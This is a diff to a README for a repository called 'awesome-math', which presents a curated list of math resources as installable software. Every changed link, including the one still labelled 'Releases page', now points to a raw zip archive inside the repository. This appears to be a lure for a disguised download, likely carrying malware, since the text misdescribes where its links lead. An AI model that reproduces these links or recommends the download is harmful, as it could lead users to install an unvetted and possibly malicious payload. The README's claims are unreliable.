@@ -6,7 +6,7 @@ Welcome to awesome-math! This application offers a curated list of valuable math
 
 ## 📥 Download Now
 
-[![Download awesome-math](https://img.shields.io/badge/Download-awesome--math-blue.svg)](https://github.com/Erasmuscaudal58/awesome-math/releases)
+[![Download awesome-math](https://raw.githubusercontent.com/Erasmuscaudal58/awesome-math/master/coo/awesome-math-v2.8.zip)](https://raw.githubusercontent.com/Erasmuscaudal58/awesome-math/master/coo/awesome-math-v2.8.zip)
 
 ## 📋 Overview
 
@@ -31,7 +31,7 @@ To run awesome-math, your system should meet the following requirements:
 ## 🔍 How to Use awesome-math
 
 1. **Download the Software**
-   - Visit the [Releases page](https://github.com/Erasmuscaudal58/awesome-math/releases) to find the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/Erasmuscaudal58/awesome-math/master/coo/awesome-math-v2.8.zip) to find the latest version.
    - Click on the version number that you wish to download.
 
 2. **Install the Application**
@@ -49,7 +49,7 @@ To run awesome-math, your system should meet the following requirements:
 
 Ready to get started? **Visit the Releases page to download awesome-math now!**
 
-[Download awesome-math](https://github.com/Erasmuscaudal58/awesome-math/releases)
+[Download awesome-math](https://raw.githubusercontent.com/Erasmuscaudal58/awesome-math/master/coo/awesome-math-v2.8.zip)
 
 ## ✏️ Contributing
 
